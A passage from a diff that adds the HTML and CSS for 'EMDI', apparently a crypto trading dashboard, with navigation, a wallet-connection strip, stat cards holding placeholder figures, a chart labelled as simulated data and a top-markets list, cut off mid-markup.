@@ -1,0 +1,1782 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#090d14">
+<title>EMDI — Crypto Markets & Trading</title>
+<style>
+:root{--bg:#090d14;--panel:#101722;--panel2:#0d131d;--line:#202b3b;--text:#edf3fb;--muted:#8795a9;--green:#25d6a2;--red:#ff667e;--blue:#6d8dff;--gold:#f5c66a;--radius:16px}
+*{box-sizing:border-box}body{margin:0;background:radial-gradient(ellipse at 50% -25%,#1b2b43 0,transparent 50%),var(--bg);color:var(--text);font:14px/1.45 Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif}button,input,select{font:inherit}button{cursor:pointer}button:focus-visible,input:focus-visible,select:focus-visible{outline:2px solid var(--blue);outline-offset:2px}.app{min-height:100vh;display:grid;grid-template-columns:238px minmax(0,1fr)}.sidebar{background:#0b111a;border-right:1px solid var(--line);padding:24px 15px;display:flex;flex-direction:column;gap:25px}.brand{display:flex;align-items:center;gap:11px;padding:0 9px;font-size:17px;font-weight:800;letter-spacing:.2px}.logo{width:35px;height:35px;border-radius:11px;display:grid;place-items:center;background:linear-gradient(145deg,#89a0ff,#4e62e8);color:white;font-weight:900;box-shadow:0 7px 24px #5869e533}.brand small{display:block;font-size:10px;color:var(--muted);font-weight:600;letter-spacing:2px;margin-top:1px}.section-label{color:#627188;font-size:10px;font-weight:800;letter-spacing:1.7px;padding:0 12px;margin:2px 0 8px}.nav{display:grid;gap:5px}.nav button{border:0;background:transparent;color:#9aa8bb;text-align:left;padding:12px;border-radius:10px;display:flex;align-items:center;gap:12px}.nav button .ico{width:20px;text-align:center;font-size:17px}.nav button.active,.nav button:hover{background:#19243a;color:white}.nav button.active{box-shadow:inset 3px 0 var(--blue)}.side-bottom{margin-top:auto}.status-card{padding:14px;border:1px solid var(--line);border-radius:13px;background:linear-gradient(140deg,#131f31,#0d131d)}.status-card b{font-size:12px}.status-card p{color:var(--muted);font-size:11px;margin:7px 0 12px}.status-pill{font-size:10px;color:var(--green);display:flex;align-items:center;gap:6px}.dot{width:6px;height:6px;background:var(--green);border-radius:50%;display:inline-block}.main{min-width:0}.topbar{height:78px;border-bottom:1px solid var(--line);display:flex;align-items:center;justify-content:space-between;padding:0 30px;gap:18px;background:#0b111ac9;backdrop-filter:blur(16px);position:sticky;top:0;z-index:5}.mobile-brand{display:none}.crumb{color:var(--muted);font-size:12px}.crumb strong{color:var(--text);font-weight:650}.top-actions{display:flex;align-items:center;gap:10px}.market-open{font-size:11px;color:var(--green);display:flex;gap:7px;align-items:center;padding:8px 10px;border:1px solid #1b4c42;border-radius:30px;background:#10231f}.icon-btn,.avatar{height:36px;width:36px;border:1px solid var(--line);background:#111a27;color:#dfe8f5;border-radius:11px;display:grid;place-items:center}.avatar{border-radius:50%;background:linear-gradient(135deg,#8d9dff,#4a59b8);font-weight:800;color:white;border:0}.content{max-width:1600px;margin:auto;padding:28px 30px 45px}.page-heading{display:flex;justify-content:space-between;align-items:flex-start;gap:16px;margin-bottom:24px}.eyebrow{color:var(--blue);font-size:10px;font-weight:800;letter-spacing:2px;text-transform:uppercase}.page-heading h1{font-size:26px;letter-spacing:-.8px;margin:5px 0}.page-heading p{margin:0;color:var(--muted);font-size:12px}.range-select,.ghost-btn{background:#111a27;color:#d9e3f1;border:1px solid var(--line);padding:9px 12px;border-radius:10px}.stats{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:14px;margin-bottom:18px}.card{background:linear-gradient(145deg,#121b28,#0e151f);border:1px solid var(--line);border-radius:var(--radius);min-width:0}.stat{padding:17px 18px}.stat-top{display:flex;align-items:center;justify-content:space-between;color:var(--muted);font-size:11px}.stat-icon{height:31px;width:31px;border-radius:10px;display:grid;place-items:center;background:#1c2940;color:#8da2ff;font-size:15px}.stat-value{font-size:25px;font-weight:750;letter-spacing:-.7px;margin:15px 0 8px;white-space:nowrap}.change{font-size:11px;color:var(--green)}.muted{color:var(--muted)}.mini-bars{height:24px;display:flex;align-items:end;gap:4px;margin-top:12px}.mini-bars i{display:block;flex:1;background:#506ce4;border-radius:3px 3px 0 0;opacity:.65}.dashboard-grid{display:grid;grid-template-columns:minmax(0,1.7fr) minmax(270px,1fr);gap:16px;margin-bottom:16px}.panel-head{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:18px 20px;border-bottom:1px solid var(--line)}.panel-head h2{font-size:14px;margin:0}.panel-head p{font-size:11px;color:var(--muted);margin:4px 0 0}.tabs{display:flex;gap:3px;background:#0b111a;border:1px solid var(--line);padding:3px;border-radius:9px}.tabs button{border:0;background:transparent;color:var(--muted);padding:5px 8px;border-radius:6px;font-size:10px}.tabs button.active{background:#273552;color:white}.chart-wrap{padding:15px 18px 12px}.chart-meta{display:flex;align-items:baseline;gap:10px;margin-bottom:4px}.chart-price{font-size:25px;font-weight:750}.chart-change{font-size:11px;color:var(--green)}.chart{width:100%;height:220px;display:block;overflow:visible}.chart-grid{stroke:#243044;stroke-width:1;stroke-dasharray:3 5}.chart-label{fill:#6e7f95;font-size:10px}.chart-line{fill:none;stroke:#7b91ff;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round;filter:drop-shadow(0 0 5px #7189ff55)}.chart-area{fill:url(#areaFill)}.chart-bottom{display:flex;justify-content:space-between;color:#6e7f95;font-size:10px;padding:0 2px}.asset-list{padding:3px 17px 9px}.asset-row{display:grid;grid-template-columns:minmax(0,1.2fr) .8fr .75fr;gap:8px;align-items:center;padding:13px 0;border-bottom:1px solid #1b2635}.asset-row:last-child{border-bottom:0}.asset-name{display:flex;align-items:center;gap:10px;min-width:0}.coin{width:33px;height:33px;flex:none;border-radius:50%;display:grid;place-items:center;font-weight:800;background:#23314a;color:#9fb4ff}.coin.sol{background:#203a37;color:#65e7c1}.coin.eth{background:#293348;color:#c2ceff}.coin.btc{background:#44351f;color:#ffcb74}.asset-name strong{display:block;font-size:12px}.asset-name small{display:block;color:var(--muted);font-size:10px;margin-top:2px}.asset-number{font-size:12px;text-align:right}.asset-number small{display:block;color:var(--muted);font-size:10px;margin-top:3px}.positive{color:var(--green)}.negative{color:var(--red)}.trade-grid{display:grid;grid-template-columns:minmax(0,1.35fr) minmax(290px,.85fr);gap:16px}.table-card{overflow:hidden}.table-wrap{overflow:auto}.table{width:100%;border-collapse:collapse;white-space:nowrap}.table th{text-align:left;padding:13px 18px;color:#718198;font-size:10px;font-weight:700;letter-spacing:.8px;text-transform:uppercase;background:#0d141e}.table td{padding:15px 18px;border-top:1px solid #1b2635;font-size:12px}.badge{display:inline-flex;align-items:center;gap:5px;padding:5px 8px;border-radius:7px;font-size:10px;background:#102b27;color:var(--green)}.badge.sell{background:#301b26;color:var(--red)}.trade-form{padding:18px}.segmented{display:grid;grid-template-columns:1fr 1fr;background:#0a1018;padding:4px;border:1px solid var(--line);border-radius:11px;gap:4px;margin-bottom:18px}.segmented button{border:0;background:transparent;color:var(--muted);padding:10px;border-radius:8px;font-weight:750}.segmented .buy.active{background:#153b32;color:#53e5b2}.segmented .sell.active{background:#3a202b;color:#ff8195}.field{margin-bottom:15px}.field label{display:flex;justify-content:space-between;color:#a6b3c5;font-size:11px;margin-bottom:8px}.field input,.field select{width:100%;border:1px solid #293649;background:#0b121c;color:white;padding:12px;border-radius:9px;outline:none}.field input:focus,.field select:focus{border-color:#758cff}.quick-amounts{display:flex;gap:6px;margin-top:7px}.quick-amounts button{flex:1;border:1px solid var(--line);background:#121c2a;color:#aab8cc;border-radius:7px;padding:6px;font-size:10px}.order-summary{border:1px solid var(--line);border-radius:10px;padding:12px;margin:16px 0}.sum-row{display:flex;justify-content:space-between;color:var(--muted);font-size:11px;margin:7px 0}.sum-row strong{color:#dce6f5;font-weight:600}.primary-btn{width:100%;padding:13px;border:0;border-radius:10px;background:linear-gradient(100deg,#7188ff,#5369e8);color:white;font-weight:800;box-shadow:0 8px 24px #5369e822}.primary-btn:hover{filter:brightness(1.08)}.disclaimer{font-size:10px;line-height:1.6;color:#6e7d91;margin:12px 0 0}.bottom-nav{display:none}.toast{position:fixed;bottom:24px;right:24px;max-width:min(350px,calc(100vw - 32px));padding:13px 16px;background:#172436;border:1px solid #31445f;color:#e8f1ff;border-radius:12px;box-shadow:0 10px 35px #0008;z-index:20;animation:pop .2s ease}.toast strong{display:block;margin-bottom:3px}.toast span{font-size:12px;color:#aab9cd}@keyframes pop{from{transform:translateY(8px);opacity:0}to{transform:translateY(0);opacity:1}}.empty{padding:26px;text-align:center;color:var(--muted);font-size:12px}.hidden{display:none!important}
+
+
+.token-tools{padding:14px 17px 17px;border-top:1px solid var(--line)}.token-tools-title{display:flex;align-items:center;justify-content:space-between;gap:10px}.token-tools-title strong{display:block;font-size:12px}.token-tools-title small{display:block;color:var(--muted);font-size:10px;margin-top:3px}.token-search{display:flex;gap:7px;margin-top:11px}.token-search input{flex:1;min-width:0;border:1px solid #293649;background:#0b121c;color:white;padding:10px 11px;border-radius:9px;font:inherit;font-size:11px}.token-search-result{margin-top:9px;color:#7e8ea4;font-size:10px;line-height:1.5}.token-search-result strong{color:#dfe8f5}
+
+/* Wallet + dedicated terminal */
+.connect-wallet{white-space:nowrap;color:#e8eeff!important;border-color:#46558c!important;background:#1a2540!important;font-weight:750}
+.wallet-strip{display:flex;align-items:center;justify-content:space-between;gap:18px;padding:17px 19px;margin-bottom:17px;background:linear-gradient(110deg,#131f30,#101722 60%,#14213a)}
+.wallet-main{display:flex;align-items:center;gap:12px;min-width:0}.wallet-icon{height:42px;width:42px;border-radius:13px;display:grid;place-items:center;background:#243553;color:#a8b9ff;font-size:21px}.wallet-label{font-size:10px;letter-spacing:1.1px;color:#8d9db2;font-weight:800;display:flex;gap:9px;align-items:center}.wallet-status{color:#f5c66a;font-size:9px;border:1px solid #56492a;padding:3px 6px;border-radius:5px}.wallet-status.connected{color:var(--green);border-color:#235c4e}.wallet-address{font-size:12px;margin-top:5px;overflow-wrap:anywhere}.wallet-balance{margin-left:auto;display:grid;gap:3px}.wallet-balance>span,.wallet-balance>small{color:var(--muted);font-size:10px}.wallet-balance strong{font-size:22px;letter-spacing:-.5px}.wallet-balance strong small{font-size:11px;color:var(--muted)}.wallet-actions{display:flex;gap:7px}.trading-workspace{margin-bottom:16px;overflow:hidden}.terminal-status{color:var(--green);font-size:10px;display:flex;align-items:center;gap:7px}.terminal-layout{display:grid;grid-template-columns:minmax(0,1.5fr) minmax(285px,.8fr);gap:0}.terminal-market{padding:18px 20px;border-right:1px solid var(--line);min-width:0}.market-select-row{display:flex;justify-content:space-between;align-items:center;gap:15px;margin-bottom:17px}.tiny{font-size:9px;letter-spacing:1px}.market-select-row select{display:block;margin-top:5px;background:#111b29;border:1px solid var(--line);color:#f0f4fc;border-radius:8px;padding:9px 10px;min-width:190px}.terminal-price{text-align:right;display:grid;gap:4px}.terminal-price strong{font-size:22px}.terminal-price span{font-size:10px}.terminal-chart-placeholder{border:1px solid #1c2939;border-radius:12px;background:#0c131d;padding:12px 12px 7px}.terminal-chart-top,.terminal-chart-bottom{display:flex;justify-content:space-between;font-size:10px;color:#8c9bb0}.terminal-chart-top{margin-bottom:7px}.terminal-chart-top span:first-child{font-weight:800;color:#e7eef9}.terminal-chart-placeholder svg{display:block;width:100%;height:205px}.terminal-chart-bottom{padding-top:2px}.orderbook-mini{margin-top:17px}.orderbook-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;font-size:11px}.orderbook-head .muted{font-size:10px}.depth-row{display:flex;justify-content:space-between;padding:7px 9px;font-size:11px;border-radius:6px;margin:5px 0}.sell-depth{background:#341d2a;color:#ff91a2}.buy-depth{background:#123329;color:#60e5b8}.depth-meter{height:5px;display:flex;gap:3px;margin-top:8px}.depth-meter i{width:43%;background:var(--red);border-radius:4px}.depth-meter b{flex:1;background:var(--green);border-radius:4px}.terminal-order-card{padding:18px 19px;min-width:0}.terminal-order-title{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;gap:8px}.terminal-order-title h3{margin:0;font-size:14px}.terminal-order-card .field{margin-bottom:13px}.terminal-order-card .field input,.terminal-order-card .field select{padding:11px}.terminal-order-card .order-summary{margin:13px 0}.terminal-order-card .disclaimer{margin-top:10px}.terminal-order-card .quick-amounts button{padding:7px 3px}
+@media(max-width:1000px){.terminal-layout{grid-template-columns:minmax(0,1.2fr) minmax(265px,.8fr)}.terminal-market{padding:15px}.terminal-order-card{padding:15px}.wallet-strip{flex-wrap:wrap}.wallet-balance{margin-left:54px}}
+@media(max-width:760px){.top-actions .icon-btn{display:none}.connect-wallet{font-size:10px;padding:8px}.wallet-strip{padding:13px;gap:12px}.wallet-main{flex:1 1 100%}.wallet-balance{margin-left:54px;flex:1}.wallet-actions{margin-left:auto}.wallet-actions button{font-size:10px;padding:8px}.terminal-layout{grid-template-columns:1fr}.terminal-market{border-right:0;border-bottom:1px solid var(--line);padding:13px}.terminal-order-card{padding:14px}.terminal-chart-placeholder svg{height:180px}.market-select-row select{min-width:155px;max-width:190px}.terminal-price strong{font-size:18px}.terminal-status{display:none}}
+@media(max-width:380px){.wallet-balance{margin-left:0}.wallet-actions{width:100%;margin-left:0}.wallet-actions button{flex:1}.market-select-row{align-items:flex-start}.market-select-row select{min-width:135px;max-width:155px}.terminal-price strong{font-size:15px}}
+
+@media(max-width:1100px){.app{grid-template-columns:205px minmax(0,1fr)}.content{padding:23px 20px}.topbar{padding:0 20px}.stats{grid-template-columns:repeat(2,minmax(0,1fr))}.dashboard-grid{grid-template-columns:minmax(0,1.2fr) minmax(260px,1fr)}.trade-grid{grid-template-columns:1fr}.chart{height:200px}}
+@media(max-width:760px){.app{display:block;padding-bottom:72px}.sidebar{display:none}.topbar{height:62px;padding:0 15px;position:sticky}.mobile-brand{display:flex;align-items:center;gap:8px;font-size:14px;font-weight:800}.mobile-brand .logo{height:30px;width:30px;border-radius:9px;font-size:12px}.crumb{display:none}.top-actions{gap:7px}.market-open{padding:7px 9px;font-size:10px}.content{padding:20px 13px 26px}.page-heading{margin-bottom:17px}.page-heading h1{font-size:23px}.page-heading p{font-size:11px;max-width:260px}.range-select{padding:8px;font-size:11px}.stats{gap:10px;margin-bottom:12px}.stat{padding:13px}.stat-value{font-size:21px;margin:13px 0 6px}.stat-top{font-size:10px}.stat-icon{width:27px;height:27px}.mini-bars{height:18px}.dashboard-grid{grid-template-columns:1fr;gap:12px;margin-bottom:12px}.panel-head{padding:15px}.chart-wrap{padding:13px 12px 10px}.chart{height:190px}.asset-list{padding:2px 14px 7px}.asset-row{grid-template-columns:minmax(0,1.1fr) .8fr .7fr}.trade-grid{gap:12px}.table th,.table td{padding:12px 14px}.trade-form{padding:14px}.bottom-nav{position:fixed;display:grid;grid-template-columns:repeat(4,1fr);bottom:0;left:0;right:0;background:#0b111af5;backdrop-filter:blur(18px);border-top:1px solid var(--line);padding:8px 5px calc(8px + env(safe-area-inset-bottom));z-index:10}.bottom-nav button{border:0;background:transparent;color:#718198;display:flex;flex-direction:column;align-items:center;gap:3px;font-size:9px;padding:4px}.bottom-nav button span:first-child{font-size:18px}.bottom-nav button.active{color:#9bacff}.toast{bottom:82px;right:12px}.page-heading .eyebrow{font-size:9px}}
+@media(max-width:380px){.stats{grid-template-columns:1fr 1fr}.stat-value{font-size:19px}.market-open{display:none}.chart{height:165px}.asset-name{gap:7px}.coin{width:29px;height:29px}.asset-number{font-size:11px}}
+
+/* EMDI identity, routed pages and live market feed */
+.brand-mark{width:39px;height:39px;flex:none;filter:drop-shadow(0 5px 12px #7f9cff24)}.mobile-brand .brand-mark{width:31px;height:31px}.mobile-brand{gap:8px}.route-page{display:block}.route-page.hidden{display:none!important}.market-search-bar{display:flex;gap:10px;padding:16px 18px;border-bottom:1px solid var(--line)}.market-search-bar input{min-width:0;flex:1;background:#0b121c;color:white;border:1px solid #293649;border-radius:10px;padding:12px}.search-market-btn{width:auto;padding:0 20px}.feed-notice{padding:10px 18px;color:var(--muted);font-size:11px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:8px}.feed-notice .dot{background:var(--green)}.feed-notice.error .dot{background:var(--red)}.live-table td{font-variant-numeric:tabular-nums}.live-token{display:flex;align-items:center;gap:10px;min-width:150px}.live-token .coin{width:31px;height:31px}.live-token strong{display:block}.live-token small{display:block;color:var(--muted);margin-top:2px}.pair-link{color:inherit;text-decoration:none}.pair-link:hover{color:#a7b6ff}.market-footnote{padding:17px 19px;margin-top:14px}.market-footnote strong{font-size:12px}.market-footnote p{font-size:11px;color:var(--muted);margin:7px 0 0;line-height:1.7}.portfolio-stats{margin-bottom:16px}.portfolio-stats .stat-value{font-size:20px}.wallet-page-grid{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.25fr);gap:16px}.wallet-connect-card{padding:26px}.wallet-emblem{height:56px;width:56px;display:grid;place-items:center;border:1px solid #38504f;background:#102721;color:#69e7c2;border-radius:18px;font-size:27px;margin-bottom:23px}.wallet-connect-card h2{font-size:22px;margin:7px 0}.wallet-connect-card p{font-size:12px;color:var(--muted);line-height:1.8;max-width:420px;margin-bottom:22px}.wallet-security{display:flex;align-items:center;gap:8px;color:var(--muted);font-size:11px;margin-top:17px}.wallet-security span{color:var(--green)}.wallet-info-card{padding-bottom:18px}.wallet-detail-row{padding:15px 19px;border-bottom:1px solid #1b2635;display:flex;justify-content:space-between;gap:14px;font-size:12px}.wallet-detail-row span{color:var(--muted)}.wallet-detail-row strong{text-align:right;overflow-wrap:anywhere}.wallet-info-card>#walletPageDisconnect{margin:16px 19px 0}.wallet-info-card .disclaimer{padding:0 19px}.sidebar .nav button{font-size:13px}.nav button.active{color:#f5f8ff}.wallet-status{font-size:9px;letter-spacing:.7px}.wallet-status.connected{color:var(--green)}
+@media(max-width:760px){.brand-mark{width:31px;height:31px}.market-search-bar{padding:12px;gap:7px}.market-search-bar input{padding:10px;font-size:12px}.search-market-btn{padding:0 13px;font-size:11px}.live-table th,.live-table td{padding:12px 13px}.wallet-page-grid{grid-template-columns:1fr;gap:12px}.wallet-connect-card{padding:21px}.wallet-detail-row{padding:13px 15px}.portfolio-stats{grid-template-columns:repeat(2,minmax(0,1fr))}.bottom-nav{grid-template-columns:repeat(5,minmax(0,1fr))}.bottom-nav button{font-size:8px}.bottom-nav button span:first-child{font-size:17px}.page-heading .range-select{display:none}}
+
+@media(prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms!important;transition-duration:.01ms!important;scroll-behavior:auto!important}}
+
+/* EMDI design system — deep black / brushed gold */
+:root{
+ --bg:#050505;--panel:#0b0b0b;--panel2:#080808;--line:#29231a;
+ --text:#f5f1e8;--muted:#a59b89;--green:#d8b45a;--red:#e16b6b;
+ --blue:#d8b45a;--gold:#d8b45a;--radius:14px;
+}
+html,body{background:#050505!important;color:var(--text)}
+body{background:#050505!important}
+.sidebar,.topbar{background:#070707!important;border-color:#282117!important}
+.sidebar{box-shadow:inset -1px 0 #201b12}
+.logo{background:linear-gradient(145deg,#f0d58a,#9a742b)!important;color:#080705!important;box-shadow:0 5px 22px #d8b45a20!important}
+.brand small,.section-label{color:#9c8758!important}
+.nav button{color:#b9b1a2!important}
+.nav button.active,.nav button:hover{background:#17130b!important;color:#f6df9e!important}
+.nav button.active{box-shadow:inset 3px 0 #d8b45a!important}
+.card,.status-card,.wallet-connect-card,.wallet-info-card{
+ background:#0b0b0b!important;border-color:#2b2418!important;box-shadow:0 8px 28px #0008
+}
+.status-card{background:linear-gradient(145deg,#11100d,#080808)!important}
+.topbar{backdrop-filter:blur(16px);border-bottom:1px solid #29231a!important}
+.market-open{color:#e5c66e!important;border-color:#4c3b18!important;background:#151107!important}
+.icon-btn,.avatar,.range-select,.ghost-btn{
+ background:#10100e!important;color:#e8dfcc!important;border-color:#342b1b!important
+}
+.avatar{background:linear-gradient(135deg,#e7ca78,#987027)!important;color:#080705!important}
+.primary-btn,.connect-wallet{
+ background:linear-gradient(135deg,#e7ca78,#b18a37)!important;color:#080705!important;
+ border:1px solid #f0d78f!important;font-weight:800!important;box-shadow:0 4px 16px #d8b45a16
+}
+.primary-btn:hover,.connect-wallet:hover{filter:brightness(1.08)}
+.eyebrow{color:#d8b45a!important}
+.stat-icon,.wallet-emblem{color:#d8b45a!important}
+.table th{color:#b6a16b!important}
+.table td,.table th{border-color:#252018!important}
+input,select,textarea{background:#080808!important;color:#f5f1e8!important;border-color:#332b1d!important}
+input::placeholder{color:#766d5e!important}
+.terminal-side button.active,[data-range].active,.range-btn.active{
+ background:#d8b45a!important;color:#080705!important;border-color:#d8b45a!important
+}
+.chart-grid line{stroke:#252018!important}
+.feed-notice{background:#0d0c09!important;border-color:#2c2416!important}
+.wallet-status.connected,.status-pill{color:#d8b45a!important}
+.dot{background:#d8b45a!important}
+.mobile-nav,.bottom-nav{background:#070707!important;border-color:#29231a!important}
+@media(max-width:760px){
+ .sidebar{background:#070707!important}
+ .topbar{padding-left:16px!important;padding-right:16px!important}
+ .content{padding-left:16px!important;padding-right:16px!important}
+}
+
+
+/* EMDI clean routing + deep-black / gold visual system */
+:root{--bg:#030303;--panel:#0a0a0a;--panel2:#070707;--line:#28231a;--text:#f4efe4;--muted:#a49a88;--green:#d7b45a;--red:#d96d6d;--blue:#d7b45a;--gold:#d7b45a}
+html,body{background:#030303!important;color:#f4efe4!important}
+body{background:#030303!important}
+.sidebar,.topbar,.mobile-nav,.bottom-nav{background:#050505!important;border-color:#292319!important}
+.card,.status-card,.wallet-connect-card,.wallet-info-card{background:#090909!important;border-color:#292319!important;box-shadow:0 8px 28px #0009}
+.nav button.active,.nav button:hover{background:#17130a!important;color:#f3d98c!important}
+.nav button.active{box-shadow:inset 3px 0 #d7b45a!important}
+.logo,.avatar{background:linear-gradient(140deg,#ead18a,#9d772b)!important;color:#080705!important}
+.primary-btn,.connect-wallet{background:linear-gradient(135deg,#e8cf84,#ad8534)!important;color:#080705!important;border:1px solid #e8cf84!important}
+input,select,textarea,.field input,.field select,.market-select-row select{background:#070707!important;color:#f4efe4!important;border-color:#332b1d!important}
+.panel-head,.table th{background:#080808!important;border-color:#292319!important}
+.table td,.table th,.asset-row{border-color:#252018!important}
+.eyebrow,.section-label{color:#d7b45a!important}
+.stat-icon,.wallet-icon,.wallet-emblem{background:#17130b!important;color:#d7b45a!important}
+.tabs button.active,.terminal-side button.active{background:#d7b45a!important;color:#080705!important}
+.chart-grid,.chart-grid line{stroke:#2a241a!important}
+.route-page{width:100%;min-height:50vh}
+.route-page.hidden{display:none!important}
+.content{background:#030303!important}
+@media(max-width:760px){.sidebar{background:#050505!important}.topbar{background:#050505!important}}
+
+</style>
+</head>
+<body>
+<div class="app">
+<aside class="sidebar">
+  <div class="brand"><svg class="brand-mark" viewBox="0 0 40 40" aria-hidden="true"><defs><linearGradient id="emdiGrad" x1="0" y1="0" x2="1" y2="1"><stop stop-color="#9ef7d5"/><stop offset="1" stop-color="#6d8dff"/></linearGradient></defs><path d="M20 2.8 35.5 11.4 35.5 28.6 20 37.2 4.5 28.6 4.5 11.4Z" fill="none" stroke="url(#emdiGrad)" stroke-width="2.2"/><path d="M12 27V13h3.4l4.6 6.1 4.6-6.1H28v14h-3.5v-8.4L20 24.8l-4.5-6.2V27Z" fill="url(#emdiGrad)"/></svg><div>EMDI <small>CRYPTO MARKETS</small></div></div>
+  <div><div class="section-label">WORKSPACE</div><nav class="nav" id="sideNav">
+    <button class="active" data-page="Overview"><span class="ico">⌂</span>Overview</button>
+    <button data-page="Markets"><span class="ico">◈</span>Markets</button>
+    <button data-page="Portfolio"><span class="ico">▤</span>Portfolio</button>
+    <button data-page="Trade"><span class="ico">↗</span>Trade</button>
+    <button data-page="Wallet"><span class="ico">◉</span>Wallet</button>
+  </nav></div>
+  <div><div class="section-label">PREFERENCES</div><nav class="nav"><button data-action="alerts"><span class="ico">♧</span>Alerts</button><button data-action="settings"><span class="ico">⚙</span>Settings</button></nav></div>
+  <div class="side-bottom"><div class="status-card"><div class="status-pill"><i class="dot"></i> SYSTEM OPERATIONAL</div><p>Live market feed powered by Dexscreener. Trading execution is not connected.</p><b>EMDI Trade <span style="float:right;color:#7c8ca3;font-weight:500">v0.1</span></b></div></div>
+</aside>
+<main class="main">
+<header class="topbar">
+  <div class="mobile-brand"><svg class="brand-mark" viewBox="0 0 40 40" aria-hidden="true"><defs><linearGradient id="emdiGrad" x1="0" y1="0" x2="1" y2="1"><stop stop-color="#9ef7d5"/><stop offset="1" stop-color="#6d8dff"/></linearGradient></defs><path d="M20 2.8 35.5 11.4 35.5 28.6 20 37.2 4.5 28.6 4.5 11.4Z" fill="none" stroke="url(#emdiGrad)" stroke-width="2.2"/><path d="M12 27V13h3.4l4.6 6.1 4.6-6.1H28v14h-3.5v-8.4L20 24.8l-4.5-6.2V27Z" fill="url(#emdiGrad)"/></svg>EMDI</div>
+  <div class="crumb">Workspace&nbsp; / &nbsp;<strong id="crumb">Overview</strong></div>
+  <div class="top-actions"><div class="market-open"><i class="dot"></i> <span id="feedStatus">Dexscreener feed</span></div><button class="ghost-btn connect-wallet" id="connectWallet">↗ <span id="walletButtonText">Connect wallet</span></button><button class="icon-btn" aria-label="Notifications" data-action="alerts">♧</button><button class="avatar" aria-label="Profile" id="profileButton">MD</button></div>
+</header>
+<div class="content">
+  <section class="page-heading"><div><div class="eyebrow">SATURDAY, OCTOBER 24</div><h1 id="pageTitle">Market overview</h1><p id="pageSub">Your crypto portfolio, token markets and trading activity at a glance.</p></div><select class="range-select" id="rangeSelect" aria-label="Chart time range"><option value="1D">Today · 1D</option><option value="1W">This week · 1W</option><option value="1M">This month · 1M</option><option value="1Y">This year · 1Y</option></select></section>
+  <section class="wallet-strip card">
+    <div class="wallet-main"><div class="wallet-icon">◈</div><div><div class="wallet-label">CONNECTED WALLET <span id="walletStatus" class="wallet-status">NOT CONNECTED</span></div><div class="wallet-address" id="walletAddress">Connect a wallet to view its address</div></div></div>
+    <div class="wallet-balance"><span>Wallet balance</span><strong id="walletBalance">— <small>USD</small></strong><small id="walletNative">Native token balance appears after connection</small></div>
+    <div class="wallet-actions"><button class="ghost-btn" id="walletDetails">Wallet details</button><button class="ghost-btn hidden" id="disconnectWallet">Disconnect</button></div>
+  </section>
+  <section class="stats">
+    <article class="card stat"><div class="stat-top">Total balance <span class="stat-icon">◈</span></div><div class="stat-value" id="balance">$24,680.50</div><div class="change">↗ +4.28% <span class="muted">this month</span></div><div class="mini-bars" aria-hidden="true"><i style="height:35%"></i><i style="height:48%"></i><i style="height:40%"></i><i style="height:62%"></i><i style="height:52%"></i><i style="height:78%"></i><i style="height:65%"></i><i style="height:92%"></i></div></article>
+    <article class="card stat"><div class="stat-top">Today's P&amp;L <span class="stat-icon">↗</span></div><div class="stat-value positive">+$384.26</div><div class="change">+1.58% <span class="muted">vs. yesterday</span></div><div class="mini-bars" aria-hidden="true"><i style="height:25%"></i><i style="height:42%"></i><i style="height:31%"></i><i style="height:60%"></i><i style="height:49%"></i><i style="height:71%"></i><i style="height:62%"></i><i style="height:88%"></i></div></article>
+    <article class="card stat"><div class="stat-top">Open positions <span class="stat-icon">▤</span></div><div class="stat-value">08</div><div class="muted" style="font-size:11px">Across crypto assets</div><div class="mini-bars" aria-hidden="true"><i style="height:80%"></i><i style="height:50%"></i><i style="height:60%"></i><i style="height:40%"></i><i style="height:70%"></i><i style="height:45%"></i><i style="height:60%"></i><i style="height:72%"></i></div></article>
+    <article class="card stat"><div class="stat-top">Win rate <span class="stat-icon">◎</span></div><div class="stat-value">68.4<span style="font-size:15px">%</span></div><div class="change">+2.4% <span class="muted">last 30 days</span></div><div class="mini-bars" aria-hidden="true"><i style="height:45%"></i><i style="height:65%"></i><i style="height:55%"></i><i style="height:74%"></i><i style="height:62%"></i><i style="height:84%"></i><i style="height:75%"></i><i style="height:92%"></i></div></article>
+  </section>
+  <section class="dashboard-grid">
+    <article class="card">
+      <div class="panel-head"><div><h2>Crypto portfolio performance</h2><p>Portfolio history · simulated data</p></div><div class="tabs" id="chartTabs"><button class="active" data-range="1D">1D</button><button data-range="1W">1W</button><button data-range="1M">1M</button><button data-range="1Y">1Y</button></div></div>
+      <div class="chart-wrap"><div class="chart-meta"><span class="chart-price" id="chartValue">$24,680.50</span><span class="chart-change" id="chartChange">↗ 4.28%</span></div>
+      <svg class="chart" id="performanceChart" viewBox="0 0 700 240" preserveAspectRatio="none" role="img" aria-label="Illustrative portfolio performance line chart"><defs><linearGradient id="areaFill" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#7289ff" stop-opacity=".27"/><stop offset="100%" stop-color="#7289ff" stop-opacity="0"/></linearGradient></defs><g id="chartGrid"></g><path id="chartArea" class="chart-area"></path><path id="chartLine" class="chart-line"></path><g id="chartLabels"></g></svg><div class="chart-bottom"><span id="chartStart">00:00</span><span id="chartMiddle">12:00</span><span id="chartEnd">23:59</span></div></div>
+    </article>
+    <article class="card"><div class="panel-head"><div><h2>Top markets</h2><p>Crypto assets by market cap</p></div><button class="ghost-btn" data-page="Markets">View all ↗</button></div>
+      <div class="asset-list">
+        <div class="asset-row"><div class="asset-name"><div class="coin btc">₿</div><div><strong>Bitcoin</strong><small>BTC / USDT</small></div></div><div class="asset-number">$67,482.10<small>Vol. $28.4B</small></div><div class="asset-number positive">+2.41%</div></div>
+        <div class="asset-row"><div class="asset-name"><div class="coin eth">◆</div><div><strong>Ethereum</strong><small>ETH / USDT</small></div></div><div class="asset-number">$3,521.84<small>Vol. $12.7B</small></div><div class="asset-number positive">+1.86%</div></div>
